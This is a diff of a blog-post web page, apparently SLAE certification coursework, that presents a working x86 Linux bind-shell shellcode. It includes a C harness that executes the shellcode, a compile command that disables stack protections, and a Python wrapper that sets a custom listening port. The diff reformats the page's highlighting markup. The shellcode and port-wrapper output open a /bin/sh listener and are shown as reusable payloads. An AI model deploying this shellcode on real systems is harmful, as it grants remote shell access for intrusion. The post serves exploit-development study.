+</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>code</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>       <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=n>ret</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Compile with <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code>. Shellcode length is 110.</p><h2 id=making-the-listening-port-configurable>Making the listening port configurable</h2><p>Right now the port <code>1337</code> is hardcoded, let&rsquo;s make a wrapper script in python which allows for setting a custom port.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -1102,66 +889,51 @@ DESCRIPTION
 </span><span class=lnt>37
 </span><span class=lnt>38
 </span><span class=lnt>39
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
-
-<span class=kn>import</span> <span class=nn>sys</span>
-
-<span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>port</span><span class=p>):</span>
-
-    <span class=n>str_port</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>port</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
-
-    <span class=n>shellcode</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68</span><span class=si>{port}</span><span class=s2>\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80&#34;</span>
-
-    <span class=n>hex_port</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x</span><span class=si>{}</span><span class=se>\\</span><span class=s2>x</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>str_port</span><span class=p>[:</span><span class=mi>2</span><span class=p>],</span> <span class=n>str_port</span><span class=p>[</span><span class=mi>2</span><span class=p>:])</span>
-
-    <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x00&#34;</span> <span class=ow>in</span> <span class=n>hex_port</span><span class=p>:</span>
-        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Sorry, null byte found in that port, chose another port.&#34;</span><span class=p>)</span>
-        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Ports between 1-256 will always contain a null byte.&#34;</span><span class=p>)</span>
-        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Port: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>hex_port</span><span class=p>))</span>
-        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-    <span class=n>shellcode</span> <span class=o>=</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{port}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>hex_port</span><span class=p>)</span>
-    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Bind shell running on port </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>port</span><span class=p>))</span>
-    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Your Shellcode:&#34;</span><span class=p>)</span>
-    <span class=nb>print</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
-
-
-<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
-    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
-        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python3 wrapper.py &lt;port&gt;&#34;</span><span class=p>)</span>
-        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
-
-    <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&lt;</span> <span class=mi>1024</span><span class=p>:</span>
-        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Warning: Ports &lt; 1024 must be run as a root&#34;</span><span class=p>)</span>
-
-    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
-        <span class=k>if</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>65535</span><span class=p>):</span>
-            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Port too large&#34;</span><span class=p>)</span>
-            <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-        <span class=n>main</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
-    <span class=k>else</span><span class=p>:</span>
-        <span class=n>main</span><span class=p>(</span><span class=mi>1337</span><span class=p>)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Running the script with a custom port returns the new shellcode:</p>
-<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/assignment_1$ python wrapper.py 600
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>port</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>str_port</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>port</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68</span><span class=si>{port}</span><span class=s2>\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>hex_port</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x</span><span class=si>{}</span><span class=se>\\</span><span class=s2>x</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>str_port</span><span class=p>[:</span><span class=mi>2</span><span class=p>],</span> <span class=n>str_port</span><span class=p>[</span><span class=mi>2</span><span class=p>:])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x00&#34;</span> <span class=ow>in</span> <span class=n>hex_port</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Sorry, null byte found in that port, chose another port.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Ports between 1-256 will always contain a null byte.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Port: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>hex_port</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{port}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>hex_port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Bind shell running on port </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>port</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Your Shellcode:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python3 wrapper.py &lt;port&gt;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&lt;</span> <span class=mi>1024</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Warning: Ports &lt; 1024 must be run as a root&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>65535</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Port too large&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>main</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>main</span><span class=p>(</span><span class=mi>1337</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Running the script with a custom port returns the new shellcode:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/assignment_1$ python wrapper.py 600
 [!] Warning: Ports &lt; 1024 must be run as a root
 [+] Bind shell running on port 600
 [+] Your Shellcode:
 \x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x02\x58\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80
-</code></pre><p>There you go, hack the planet!</p>
-<hr>
-<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
-<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
-<p>Student ID: SLAE-1490</p>
-</article>
-</div><footer>
-</footer></main>
-<script src=/js/particles.min.js defer></script>
+</code></pre><p>There you go, hack the planet!</p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
 <script src=/js/particles.conf.js defer></script>
 <script src=/js/baffle.min.js async></script>
-<script src=/js/main.js defer async></script>
-</body>
-</html>
+<script src=/js/main.js defer async></script></body></html>
